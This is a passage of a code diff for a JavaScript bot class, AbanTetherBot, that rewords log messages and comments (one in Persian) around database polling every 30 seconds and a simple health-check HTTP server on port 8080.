-        this.log('POLLING', '🔄 Starting polling (every 30s)');
+        this.log('POLLING', '🔄 Starting database polling (every 30 seconds)');
         
         await this.checkDatabase();
         
@@ -624,7 +717,7 @@ class AbanTetherBot {
             }
         }, 30000);
         
-        // Health check
+        // Health check server
         const http = require('http');
         const server = http.createServer((req, res) => {
             res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -636,7 +729,7 @@ class AbanTetherBot {
         });
         
         server.listen(8080, () => {
-            this.log('SERVER', '🌐 Health check on port 8080');
+            this.log('SERVER', '🌐 Health check server running on port 8080');
         });
     }
 
@@ -653,7 +746,7 @@ class AbanTetherBot {
     }
 }
 
-// اجرا
+// اجرای ربات
 const bot = new AbanTetherBot();
 bot.start();
 
